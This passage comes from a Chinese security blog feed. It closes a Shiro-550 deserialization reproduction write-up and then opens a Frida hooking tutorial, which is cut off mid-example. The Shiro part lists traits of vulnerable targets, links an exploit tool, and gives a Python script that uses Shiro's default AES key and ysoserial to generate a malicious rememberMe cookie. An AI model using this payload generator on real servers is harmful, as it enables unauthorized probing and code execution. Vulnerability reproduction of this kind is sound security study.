class=""><p>在<strong>convertBytesToPrincipals</strong>方法中，解密后调用<strong>DefaultSerializer</strong>的<strong>deserialize</strong>方法来反序列化</p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/8.png" class=""><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到最新版本</p><p>Apache Shiro 1.2.5版本修复方法就是将默认Key加密改为生成随机的Key加密</p><p><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p> <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/9.png" class=""><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><ol><li>返回包cookie中存在rememberMe=deleteMe</li><li>返回包cookie中存在rememberMexxxx=deleteMe，相应的请求中的cookie也要设置为rememberMexxxx</li></ol><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h5 id="DNSLOG-payload生成"><a href="#DNSLOG-payload生成" class="headerlink" title="DNSLOG payload生成"></a>DNSLOG payload生成</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(<span class="hljs-string">&quot;http://xx.xxx.xx&quot;</span>)  <span class="hljs-comment">#域名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><h5 id="ShiroExploit"><a href="#ShiroExploit" class="headerlink" title="ShiroExploit"></a>ShiroExploit</h5><p><a href="https://github.com/KpLi0rn/ShiroExploit">https://github.com/KpLi0rn/ShiroExploit</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida教程</title>
    <link href="/2021/08/25/frida%E6%95%99%E7%A8%8B/"/>
    <url>/2021/08/25/frida%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="frida环境搭建"><a href="#frida环境搭建" class="headerlink" title="frida环境搭建"></a>frida环境搭建</h2><ol><li><p>根据机器cpu架构选择下载frida: <a href="https://github.com/frida/frida/releases">frida sever</a></p></li><li><p>解压获得frida-server-x.x.x-x，将该文件上传至Android /data/local/tmp下</p></li><li><p>赋予该文件执行权限，chmod 777 frida-server-x.x.x-x</p></li><li><p>运行该文件， ./frida-server-x.x.x-x</p></li><li><p>python安装frida，安装的版本一定与下载的文件版本对应</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">pip3 install frida-tools  <span class="hljs-comment">//最好挂个梯子,要不容易一直卡在setup</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="frida工具介绍"><a href="#frida工具介绍" class="headerlink" title="frida工具介绍"></a>frida工具介绍</h2><p>安装完成后在python的Scripts目录下会有frida ，frida-trace，frida-ps，frida-discover ，frida-kill ，frida-ls-devices，6个EXE可执行文件。</p><h3 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h3><pre><code>1. frida -U     包名                     ---调试连接到电脑上设备中的应用2. frida  进程名                        ---打开本地进程3. frida -U -f 进程名 -l 脚本   --- 进程注入js脚本</code></pre><h3 id="frida–ps"><a href="#frida–ps" class="headerlink" title="frida–ps"></a>frida–ps</h3><pre><code>用于列出进程的命令行工具1. frida-ps -U    ---列出设备上的所有进程2. frida-ps -Ua   ---列出设备上的所有应用名称3. frida-ps -Uai  ---列举出来设备上的所有已安装应用程序和对应的名字4. frida-ps -D PID ---连接指定设备5. frida-ps -D &lt;DEVICE-ID&gt; -a ---检查进程是否被杀死</code></pre><h3 id="frida-trace"><a href="#frida-trace" class="headerlink" title="frida-trace"></a>frida-trace</h3><pre><code> 动态跟踪函数调用的工具 1. frida-trace -i &quot;recv&quot; 包名  跟踪recv方法 2. frida-trace -m &quot;-[NSString isEqualToString]&quot; 包名   ---追踪oc isEqualToString方法</code></pre><h3 id="frida-discover"><a href="#frida-discover" class="headerlink" title="frida-discover"></a>frida-discover</h3><pre><code> 1. frida-discover -n 包名/frida-discover -p pid ---发现程序内部函数</code></pre><h3 id="frida-kill"><a href="#frida-kill" class="headerlink" title="frida-kill"></a>frida-kill</h3><pre><code> 终止进程的命令行工具 1. frida-kill -D &lt;DEVICE-ID&gt; &lt;PID&gt; ---杀死进程</code></pre><h3 id="frida-ls-devices"><a href="#frida-ls-devices" class="headerlink" title="frida-ls-devices"></a>frida-ls-devices</h3><ol><li>列出所有连接到电脑上的设备 注：<ol><li>frida-ps -Uai  查看所有安装的应用。</li><li>frida-ps -D cca1b9055 -a -i 可以指定查看某个设备的进程。</li><li>frida-trace 用于跟踪函数或者 Objective-C 方法的调用-i 跟踪某个函数，-x 排除某个函数。-m 跟踪某个 Objective-C 方法，-M 排除某个 Objective-C 方法。-a 跟踪某一个地址，需要指名模块的名称。</li></ol></li></ol><h2 id="frida编译"><a href="#frida编译" class="headerlink" title="frida编译"></a>frida编译</h2><p>用于学习frida原理及去特征</p><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><ul><li>ubuntu</li><li>python3</li><li>node(v14.14.0)</li><li>NDK</li></ul><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><ol><li><p>安装依赖</p><p>以下是编译需要的环境，如果有则不需要在安装，node推荐去官网下载（<a href="https://nodejs.org)/">https://nodejs.org）</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install build-essential curl git lib32stdc++-9-dev libc6-dev-i386 nodejs npm python3-dev python3-pip<br></code></pre></td></tr></table></figure></li><li><p>拉源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone --recurse-submodules https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/frida/</span>frida.git<br></code></pre></td></tr></table></figure></li><li><p>设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">androidNdk=<span class="hljs-string">&quot;/Users/cola/Library/Android/sdk/ndk/android-ndk-r22b&quot;</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$androidNdk</span>:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> ANDROID_NDK_ROOT=<span class="hljs-variable">$androidNdk</span><br><span class="hljs-built_in">export</span> NDK_HOME=<span class="hljs-variable">$androidNdk</span><br></code></pre></td></tr></table></figure></li><li><p>编译（第一次编译会下载编译工具,用梯子快一些不会出现奇怪的问题）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> core-android-arm<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure></li><li><p>编译完成</p><p>编译后的文件在build目录下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">build/frida-android-arm64/bin/frida-server<br>build/frida-android-arm64/lib/frida-gadget.so<br>.......<br></code></pre></td></tr></table></figure></li></ol><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> libc = Module.findBaseAddress(<span class="hljs-string">&#x27;libc.so&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(hexdump(libc, &#123;<br>  <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">length</span>: <span class="hljs-number">64</span>,<br>  <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>&#125;));<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  7f <span class="hljs-number">45</span> 4c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .ELF............<br><span class="hljs-number">00000010</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ..(........<span class="hljs-number">.4</span>...<br><span class="hljs-number">00000020</span>  <span class="hljs-number">34</span> a8 <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span>  <span class="hljs-number">4.</span>.....<span class="hljs-number">.4</span>. ...(.<br><span class="hljs-number">00000030</span>  1e <span class="hljs-number">00</span> 1d <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .......<span class="hljs-number">.4</span>..<span class="hljs-number">.4</span>...<br><br></code></pre></td></tr></table></figure><h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><p>send是在python层定义的on_message回调函数，jscode内所有的信息都被监控script.on(‘message’, on_message)，当输出信息的时候on_message函数会拿到其数据再通过format转换， 其最重要的功能也是最核心的是能够直接将数据以json格式输出，当然数据是二进制的时候也依然是可以使用send，十分方便.</p><h3 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h3><table><thead><tr><th>索引</th><th>API</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>new Int64(v)</td><td>定义一个有符号Int64类型的变量值为v，参数v可以是字符串或者以0x开头的的十六进制值</td></tr><tr><td>2</td><td>new UInt64(v)</td><td>定义一个无符号Int64类型的变量值为v，参数v可以是字符串或者以0x开头的的十六进制值</td></tr><tr><td>3</td><td>new NativePointer(s)</td><td>定义一个指针，指针地址为s</td></tr><tr><td>4</td><td>ptr(“0”)</td><td>定义一个指针</td></tr></tbody></table><p> example:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new Int64(1):&quot;</span>+<span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new UInt64(1):&quot;</span>+<span class="hljs-keyword">new</span> UInt64(<span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new NativePointer(0xEC644071):&quot;</span>+<span class="hljs-keyword">new</span> NativePointer(<span class="hljs-number">0xEC644071</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new ptr(&#x27;0xEC644071&#x27;):&quot;</span>+<span class="hljs-keyword">new</span> ptr(<span class="hljs-number">0xEC644071</span>));<br>&#125;);<br>    输出效果如下：<br>    <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>):<span class="hljs-number">1</span><br>    <span class="hljs-keyword">new</span> UInt64(<span class="hljs-number">1</span>):<span class="hljs-number">1</span><br>    <span class="hljs-keyword">new</span> NativePointer(<span class="hljs-number">0xEC644071</span>):<span class="hljs-number">0xec644071</span><br>    <span class="hljs-keyword">new</span> ptr(<span class="hljs-string">&#x27;0xEC644071&#x27;</span>):<span class="hljs-number">0xec644071</span><br><br></code></pre></td></tr></table></figure><table><thead><tr><th>索引</th><th>API</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>add(rhs)、sub(rhs)、and(rhs)、or(rhs)、xor(rhs)</td><td>加、减、逻辑运算</td></tr><tr><td>2</td><td>shr(N)、shl(n)</td><td>向右/向左移位n位生成新的Int64</td></tr><tr><td>3</td><td>Compare(Rhs)</td><td>返回整数比较结果</td></tr><tr><td>4</td><td>toNumber()</td><td>转换为数字</td></tr><tr><td>5</td><td>toString([radix=10])</td><td>转换为可选基数的字符串(默认为10)</td></tr></tbody></table><p> example:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"> Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new Int64(1):&quot;</span>+<span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new UInt64(1):&quot;</span>+<span class="hljs-keyword">new</span> UInt64(<span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new NativePointer(0xEC644071):&quot;</span>+<span class="hljs-keyword">new</span> NativePointer(<span class="hljs-number">0xEC644071</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new ptr(&#x27;0xEC644071&#x27;):&quot;</span>+<span class="hljs-keyword">new</span> ptr(<span class="hljs-number">0xEC644071</span>));<br>&#125;);<br>    输出效果如下：<br>    <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>):<span class="hljs-number">1</span><br>    <span class="hljs-keyword">new</span> UInt64(<span class="hljs-number">1</span>):<span class="hljs-number">1</span><br>    <span class="hljs-keyword">new</span> NativePointer(<span class="hljs-number">0xEC644071</span>):<span class="hljs-number">0xec644071</span><br>    <span class="hljs-keyword">new</span> ptr(<span class="hljs-string">&#x27;0xEC644071&#x27;</span>):<span class="hljs-number">0xec644071</span><br><br></code></pre></td></tr></table></figure><h3 id="Process对象"><a href="#Process对象" class="headerlink" title="Process对象"></a>Process对象</h3><h4 id="Process-id"><a href="#Process-id" class="headerlink" title="Process.id"></a>Process.id</h4><p>返回附加目标进程的PID</p><h4 id="Process-isDebuggerAttached"><a href="#Process-isDebuggerAttached" class="headerlink" title="Process.isDebuggerAttached()"></a>Process.isDebuggerAttached()</h4><p>检测当前是否对目标程序已经附加</p><h4 id="Process-enumerateModules"><a href="#Process-enumerateModules" class="headerlink" title="Process.enumerateModules()"></a>Process.enumerateModules()</h4><p>枚举当前加载的模块，返回模块对象的数组。</p><p>Process.enumerateModules()会枚举当前所有已加载的so模块，并且返回了数组Module对象.</p><p>example:</p><p>在js中能够直接使用Process对象的所有api，调用了Process.enumerateModules()方法之后会返回一个数组，数组中存储N个叫Module的对象,for循环遍历，使用下标的方式调用了Module对象的name属性，name是so模块的名称</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> frida_Process() &#123;<br>    Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>        var process_Obj_Module_Arr = Process.enumerateModules();<br>        <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>; i &lt; process_Obj_Module_Arr.length; i++) &#123;<br>            console.log(&quot;&quot;,process_Obj_Module_Arr[i].name);<br>        &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Process,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="Process-enumerateThreads"><a href="#Process-enumerateThreads" class="headerlink" title="Process.enumerateThreads()"></a>Process.enumerateThreads()</h4><p>枚举当前所有的线程，返回包含以下属性的对象数组：</p><table><thead><tr><th>索引</th><th>属性</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>id</td><td>线程id</td></tr><tr><td>2</td><td>state</td><td>当前运行状态有running, stopped, waiting, uninterruptible or halted</td></tr><tr><td>3</td><td>context</td><td>带有键pc和sp的对象，它们是分别为ia32/x64/arm指定EIP/RIP/PC和ESP/RSP/SP的NativePointer对象。也可以使用其他处理器特定的密钥，例如eax、rax、r0、x0等。</td></tr></tbody></table><p>examlpe:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">var</span> enumerateThreads =  Process.enumerateThreads();<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; enumerateThreads.length; i++) &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;id:&quot;</span>,enumerateThreads[i].id);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;state:&quot;</span>,enumerateThreads[i].state);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;context:&quot;</span>,<span class="hljs-built_in">JSON</span>.stringify(enumerateThreads[i].context));<br>        &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Process,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="Process-getCurrentThreadId"><a href="#Process-getCurrentThreadId" class="headerlink" title="Process.getCurrentThreadId()"></a>Process.getCurrentThreadId()</h4><p>获取此线程的操作系统特定 ID 作为数字</p><h3 id="Module对象"><a href="#Module对象" class="headerlink" title="Module对象"></a>Module对象</h3><h4 id="Module对象的属性"><a href="#Module对象的属性" class="headerlink" title="Module对象的属性"></a>Module对象的属性</h4><table><thead><tr><th>索引</th><th>属性</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>name</td><td>模块名称</td></tr><tr><td>2</td><td>base</td><td>模块地址，其变量类型为NativePointer</td></tr><tr><td>3</td><td>size</td><td>大小</td></tr><tr><td>4</td><td>path</td><td>完整文件系统路径</td></tr></tbody></table><h4 id="Module对象的API"><a href="#Module对象的API" class="headerlink" title="Module对象的API"></a>Module对象的API</h4><table><thead><tr><th>索引</th><th>API</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>Module.load()</td><td>加载指定so文件，返回一个Module对象</td></tr><tr><td>2</td><td>enumerateImports()</td><td>枚举所有Import库函数，返回Module数组对象</td></tr><tr><td>3</td><td>enumerateExports()</td><td>枚举所有Export库函数，返回Module数组对象</td></tr><tr><td>4</td><td>enumerateSymbols()</td><td>枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td>5</td><td>Module.findExportByName(exportName)、Module.getExportByName(exportName)</td><td>寻找指定so中export库中的函数地址</td></tr><tr><td>6</td><td>Module.findBaseAddress(name)、Module.getBaseAddress(name)</td><td>返回so的基地址</td></tr></tbody></table><h4 id="Module-load"><a href="#Module-load" class="headerlink" title="Module.load()"></a>Module.load()</h4><p>主要用于加载指定so文件，返回一个Module对象。</p><p>example:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-comment">//参数为so的名称 返回一个Module对象</span><br>         <span class="hljs-keyword">const</span> hooks = Module.load(<span class="hljs-string">&#x27;libhello.so&#x27;</span>);<br>         <span class="hljs-comment">//输出</span><br>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;模块名称:&quot;</span>,hooks.name);<br>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;模块地址:&quot;</span>,hooks.base);<br>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;大小:&quot;</span>,hooks.size);<br>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;文件系统路径&quot;</span>,hooks.path);<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>模块名称: libhello.so<br>模块地址: <span class="hljs-number">0xdf2d3000</span><br>大小: <span class="hljs-number">24576</span><br>文件系统路径 /data/app/com.roysue.roysueapplication-7adQZoYIyp5t3G5Ef5wevQ==<span class="hljs-regexp">/lib/</span>arm/libhello.so<br></code></pre></td></tr></table></figure><h4 id="Process-EnumererateModules"><a href="#Process-EnumererateModules" class="headerlink" title="Process.EnumererateModules()"></a>Process.EnumererateModules()</h4><p>对上面的的Process.EnumererateModules()对象输出进行补全，代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-keyword">var</span> process_Obj_Module_Arr = Process.enumerateModules();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; process_Obj_Module_Arr.length; i++) &#123;<br>            <span class="hljs-keyword">if</span>(process_Obj_Module_Arr[i].path.indexOf(<span class="hljs-string">&quot;hello&quot;</span>)!=-<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;模块名称:&quot;</span>,process_Obj_Module_Arr[i].name);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;模块地址:&quot;</span>,process_Obj_Module_Arr[i].base);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;大小:&quot;</span>,process_Obj_Module_Arr[i].size);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;文件系统路径&quot;</span>,process_Obj_Module_Arr[i].path);<br>            &#125;<br>         &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>模块名称: libhello.so<br>模块地址: <span class="hljs-number">0xdf2d3000</span><br>大小: <span class="hljs-number">24576</span><br>文件系统路径 /data/app/com.roysue.roysueapplication-7adQZoYIyp5t3G5Ef5wevQ==<span class="hljs-regexp">/lib/</span>arm/libhello.so<br></code></pre></td></tr></table></figure><h4 id="enumerateImports"><a href="#enumerateImports" class="headerlink" title="enumerateImports()"></a>enumerateImports()</h4><p>该API会枚举模块中所有中的所有Import函数，示例代码如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> hooks = Module.load(<span class="hljs-string">&#x27;libhello.so&#x27;</span>);<br>        <span class="hljs-keyword">var</span> Imports = 